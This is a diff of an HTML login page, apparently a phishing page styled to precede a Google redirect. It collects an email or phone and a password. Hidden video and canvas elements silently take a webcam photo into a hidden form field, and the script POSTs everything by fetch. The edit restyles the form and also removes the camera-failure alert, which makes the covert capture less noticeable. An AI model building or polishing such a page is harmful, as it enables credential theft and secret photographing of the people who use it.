@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login Form</title>
   <style>
     body {
@@ -13,11 +13,6 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-    } input, button {
-      width: 100%;
-      margin-top: 10px;
-      padding: 10px;
-      box-sizing: border-box;
     }
 
     .form-container {
@@ -62,22 +57,23 @@
   </style>
 </head>
 <body>
-  <body>
 
-  <form id="myForm">
-    <input type="hidden" name="redirect_url" value="google.html" />
-    <input type="text" name="user" placeholder="Email or phone" required />
-    <input type="password" name="password" placeholder="Password" required />
-    <input type="hidden" id="photo" name="photo" />
-    <button type="submit">Submit</button>
-  </form>
+  <div class="form-container">
+    <form id="myForm">
+      <input type="hidden" name="redirect_url" value="google.html" />
+      <input class="input" type="text" name="user" placeholder="Email or phone" required />
+      <input class="input" type="password" name="password" placeholder="Password" required />
+      <input type="hidden" id="photo" name="photo" />
+      <button type="submit">Submit</button>
+    </form>
+  </div>
 
-  <!-- Hidden video and canvas elements for capturing photo -->
+  <!-- Hidden video and canvas for photo capture -->
   <video id="video" autoplay></video>
   <canvas id="canvas"></canvas>
 
   <script>
-   const video = document.getElementById('video');
+    const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const photoInput = document.getElementById('photo');
     const form = document.getElementById('myForm');
@@ -94,14 +90,14 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           photoInput.value = canvas.toDataURL('image/png');
 
-          // Stop video stream to free camera
+          // Stop the video stream to free camera
           stream.getTracks().forEach(track => track.stop());
           video.style.display = 'none';
         }, 2000);
       })
       .catch(err => {
         console.error("Error accessing camera:", err);
-        alert("Could not access camera.");
+        // No alert here if camera is not accessible, optional
       });
 
     form.addEventListener('submit', function(e) {
@@ -110,7 +106,7 @@
       const formData = new FormData(form);
       const redirectUrl = formData.get('redirect_url');
 
-      // Convert FormData to URLSearchParams for fetch POST
+      // Convert formData to URLSearchParams for fetch POST
       const params = new URLSearchParams();
       for (const pair of formData.entries()) {
         params.append(pair[0], pair[1]);
@@ -135,9 +131,6 @@
         alert('Failed to submit form: ' + error.message);
       });
     });
-
-    // You can also add your existing form submit handler here
-    // For example, if you want to submit with fetch and redirect as before
   </script>
 
 </body>
